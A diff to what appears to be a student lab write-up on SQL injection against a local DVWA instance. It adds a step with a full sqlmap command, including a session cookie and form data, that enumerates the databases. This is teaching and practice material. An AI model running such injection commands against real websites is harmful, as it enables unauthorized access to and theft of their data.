@@ -137,7 +137,10 @@ _start:
 4. Find the website url to attack
    ![image](https://github.com/user-attachments/assets/aaad26f0-4f4e-49f8-8910-bc69b19387f2)
    enter random to return http://localhost/vulnerabilities/sqli/?id=1
-
+5. Get information from the database
+   ```bash
+      sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=ve43k50u0t2qcfnfdhqkmga390; security=medium " --data="id=1&Submit=Submit" --dbs
+   
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**:
 
